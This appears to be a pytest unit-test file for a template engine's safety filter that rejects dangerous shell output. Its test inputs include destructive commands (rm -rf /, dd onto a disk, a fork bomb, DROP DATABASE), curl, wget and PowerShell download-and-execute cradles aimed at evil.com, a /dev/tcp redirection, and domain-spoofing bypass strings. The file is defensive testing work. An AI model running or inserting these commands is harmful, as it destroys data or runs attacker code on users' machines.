"""Unit tests for the Template Engine safety filter."""

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.templates.safety import SafetyViolationError, validate_rendered_output

pytestmark = pytest.mark.asyncio

SAFE_CONTENT = """#!/bin/bash
pip install torch==2.1.0+cu118
echo "Setup complete"
nvidia-smi
"""


async def test_safe_content_passes():
    result = await validate_rendered_output(SAFE_CONTENT, "test.sh.j2")
    assert result == SAFE_CONTENT


async def test_rm_rf_root_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output("rm -rf /", "test.sh.j2")


async def test_rm_rf_etc_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output("rm -rf /etc/passwd", "test.sh.j2")


async def test_rm_rf_home_path_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output("rm -rf /home/user/.ssh", "test.sh.j2")


async def test_rm_rf_var_log_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output("rm -rf /var/log", "test.sh.j2")


async def test_rm_rf_usr_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output("rm -rf /usr", "test.sh.j2")


async def test_rm_rf_home_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output("rm -rf $HOME", "test.sh.j2")


async def test_fork_bomb_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(":(){:|:&};:", "test.sh.j2")


async def test_curl_pipe_shell_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output("curl https://evil.com | bash", "test.sh.j2")


async def test_dd_disk_write_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output("dd if=/dev/zero of=/dev/sda", "test.sh.j2")


async def test_windows_format_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output("format C:", "test.sh.j2")


async def test_sql_drop_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output("DROP DATABASE envforage", "test.sh.j2")


async def test_wget_pipe_shell_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output("wget http://evil.com | bash", "test.sh.j2")


async def test_wget_download_execute_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(
            "wget http://evil.com/fix.sh -O /tmp/fix.sh && sh /tmp/fix.sh",
            "test.sh.j2",
        )


async def test_wget_semicolon_bypass_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(
            "wget http://evil.com/fix.sh -O /tmp/fix.sh; sh /tmp/fix.sh",
            "test.sh.j2",
        )


async def test_wget_newline_bypass_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(
            "wget http://evil.com/fix.sh -O /tmp/fix.sh\nsh /tmp/fix.sh",
            "test.sh.j2",
        )


async def test_curl_output_execute_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(
            "curl -o /tmp/evil.sh http://evil.com/evil.sh && sh /tmp/evil.sh",
            "test.sh.j2",
        )


async def test_curl_redirect_execute_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(
            "curl http://evil.com/evil.sh > /tmp/evil.sh && sh /tmp/evil.sh",
            "test.sh.j2",
        )


async def test_curl_remote_name_execute_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(
            "curl -O http://evil.com/evil.sh && sh /tmp/evil.sh",
            "test.sh.j2",
        )


async def test_powershell_piped_cradle_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(
            "iwr http://evil.com/evil.ps1 | iex",
            "test.sh.j2",
        )


async def test_powershell_iex_wrapped_cradle_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(
            "iex (iwr http://evil.com/evil.ps1)",
            "test.sh.j2",
        )


async def test_powershell_webclient_cradle_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(
            "iex (New-Object Net.WebClient).DownloadString('http://evil.com/evil.ps1')",
            "test.sh.j2",
        )


async def test_pip_install_safe():
    """pip install commands are safe and should pass."""
    content = "pip install torch==2.1.0 numpy==1.26.4"
    result = await validate_rendered_output(content, "requirements.j2")
    assert result == content


async def test_nvidia_smi_safe():
    """nvidia-smi is a safe read-only diagnostic command."""
    content = "nvidia-smi --query-gpu=name --format=csv"
    result = await validate_rendered_output(content, "verify.sh.j2")
    assert result == content


async def test_micromamba_bootstrap_safe():
    """Ensure that the standard micromamba curl download is considered safe."""
    content = "curl -Ls https://micro.mamba.pm/api/micromamba/linux-64/latest | tar -xvj -f - --strip-components=1 -C ~/.local/bin/"
    result = await validate_rendered_output(content, "setup.sh")
    assert result == content


async def test_curl_pipe_shell_with_options_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(
            "curl -L https://evil.com/p.sh | sh", "test.sh.j2"
        )


async def test_wget_pipe_shell_with_options_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(
            "wget -qO- https://evil.com/p.sh | sh", "test.sh.j2"
        )


async def test_powershell_irm_cradle_blocked():
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(
            "iex (irm http://evil.com/evil.ps1)", "test.ps1.j2"
        )
    with pytest.raises(SafetyViolationError):
        await validate_rendered_output(
            "irm http://evil.com/evil.ps1 | iex", "test.ps1.j2"
        )


async def test_uv_bootstrap_safe():
    """Ensure that uv bootstrapping using curl to sh or Invoke-RestMethod is safe."""
    content_linux = "curl -LsSf https://astral.sh/uv/install.sh | sh"
    assert await validate_rendered_output(content_linux, "setup.sh") == content_linux

    content_win = (
        "Invoke-RestMethod https://astral.sh/uv/install.ps1 | Invoke-Expression"
    )
    assert await validate_rendered_output(content_win, "setup.ps1") == content_win


async def test_ast_redirection_disk_writes_blocked():
    with pytest.raises(SafetyViolationError) as exc_info:
        await validate_rendered_output("echo hello > /dev/nvme0n1", "setup.sh")
    assert "Dangerous redirection target" in str(exc_info.value)


async def test_ast_redirection_network_cradles_blocked():
    with pytest.raises(SafetyViolationError) as exc_info:
        await validate_rendered_output("echo hello > /dev/tcp/127.0.0.1/80", "setup.sh")
    assert "Dangerous redirection target" in str(exc_info.value)


async def test_ast_redirection_subshell_blocked():
    with pytest.raises(SafetyViolationError) as exc_info:
        await validate_rendered_output("echo hello > $(get_disk)", "setup.sh")
    assert "Dynamic redirection target with subshell" in str(exc_info.value)


async def test_ast_eval_subshell_blocked():
    with pytest.raises(SafetyViolationError) as exc_info:
        await validate_rendered_output('eval "$(echo hello)"', "setup.sh")
    assert "Eval command with dynamic subshell/substitution" in str(exc_info.value)


async def test_ast_eval_pipeline_blocked():
    with pytest.raises(SafetyViolationError) as exc_info:
        await validate_rendered_output("echo hello | eval", "setup.sh")
    assert "Eval command used inside a pipeline" in str(exc_info.value)


async def test_ast_pipe_to_shell_blocked():
    with pytest.raises(SafetyViolationError) as exc_info:
        await validate_rendered_output("cat script.sh | sh", "setup.sh")
    assert "Pipe-to-shell detected in pipeline" in str(exc_info.value)


async def test_ast_shell_dynamic_arguments_blocked():
    with pytest.raises(SafetyViolationError) as exc_info:
        await validate_rendered_output("sh <(curl http://evil.com)", "setup.sh")
    assert "executed with dynamic subshell/substitution" in str(exc_info.value)


async def test_syntax_error_blocked_by_shellcheck():
    mock_process = AsyncMock()
    mock_process.returncode = 1
    mock_process.communicate = AsyncMock(
        return_value=(
            b'[{"line": 1, "column": 1, "message": "This if lacks a matching fi.", "code": 1073, "level": "error"}]',
            b"",
        )
    )

    with patch("asyncio.create_subprocess_exec", return_value=mock_process):
        with pytest.raises(SafetyViolationError) as exc_info:
            await validate_rendered_output("if true; then echo 1", "setup.sh")
    assert "Shellcheck validation failed with warnings" in str(exc_info.value)
    assert "SC1073" in str(exc_info.value)


async def test_shellcheck_warnings_fail_validation():
    mock_process = AsyncMock()
    mock_process.returncode = 1
    mock_process.communicate = AsyncMock(
        return_value=(
            b'[{"line": 2, "column": 5, "message": "Double quote to prevent globbing and word splitting.", "code": 2086, "level": "warning"}]',
            b"",
        )
    )

    with patch("asyncio.create_subprocess_exec", return_value=mock_process):
        with pytest.raises(SafetyViolationError) as exc_info:
            await validate_rendered_output("echo $var", "setup.sh")
    assert "Shellcheck validation failed with warnings" in str(exc_info.value)
    assert "SC2086" in str(exc_info.value)


async def test_shellcheck_missing_executable_graceful():
    with patch(
        "asyncio.create_subprocess_exec",
        side_effect=FileNotFoundError("shellcheck"),
    ):
        content = "echo 'safe content'"
        assert await validate_rendered_output(content, "setup.sh") == content


async def test_strict_url_whitelisting_bypass():
    bypass_payloads = [
        "curl http://evil.com/astral.sh | zsh",
        "curl http://astral.sh.evil.com/payload | zsh",
        "curl http://micro.mamba.pm.evil.com/payload | zsh",
        "curl http://evil.com/micro.mamba.pm | zsh",
    ]
    for payload in bypass_payloads:
        with pytest.raises(SafetyViolationError) as exc_info:
            await validate_rendered_output(payload, "setup.sh")
        assert "Pipe-to-shell detected in pipeline" in str(exc_info.value)

    legit_payloads = [
        "curl https://astral.sh/uv/install.sh | zsh",
        "curl http://micro.mamba.pm/latest | zsh",
        "curl https://www.astral.sh/uv/install.sh | zsh",
        "curl https://sub.micro.mamba.pm/latest | zsh",
    ]
    for payload in legit_payloads:
        assert await validate_rendered_output(payload, "setup.sh") == payload


async def test_shellcheck_timeout_graceful():
    mock_process = AsyncMock()
    mock_process.communicate = AsyncMock(side_effect=TimeoutError())
    mock_process.kill = MagicMock()
    mock_process.wait = AsyncMock()

    with patch("asyncio.create_subprocess_exec", return_value=mock_process):
        content = "echo 'safe content'"
        assert await validate_rendered_output(content, "setup.sh") == content


async def test_ast_absolute_path_and_env_pipeline_blocked():
    with pytest.raises(SafetyViolationError) as exc_info:
        await validate_rendered_output("cat script.sh | /bin/sh", "setup.sh")
    assert "Pipe-to-shell detected in pipeline" in str(exc_info.value)

    with pytest.raises(SafetyViolationError) as exc_info:
        await validate_rendered_output("cat script.sh | env bash", "setup.sh")
    assert "Pipe-to-shell detected in pipeline" in str(exc_info.value)

    with pytest.raises(SafetyViolationError) as exc_info:
        await validate_rendered_output("cat script.sh | /usr/bin/env sh", "setup.sh")
    assert "Pipe-to-shell detected in pipeline" in str(exc_info.value)


async def test_ast_absolute_path_and_env_dynamic_args_blocked():
    with pytest.raises(SafetyViolationError) as exc_info:
        await validate_rendered_output("/bin/sh <(curl http://evil.com)", "setup.sh")
    assert "executed with dynamic subshell/substitution" in str(exc_info.value)

    with pytest.raises(SafetyViolationError) as exc_info:
        await validate_rendered_output("env bash <(curl http://evil.com)", "setup.sh")
    assert "executed with dynamic subshell/substitution" in str(exc_info.value)

    with pytest.raises(SafetyViolationError) as exc_info:
        await validate_rendered_output(
            "/usr/bin/env sh <(curl http://evil.com)", "setup.sh"
        )
    assert "executed with dynamic subshell/substitution" in str(exc_info.value)
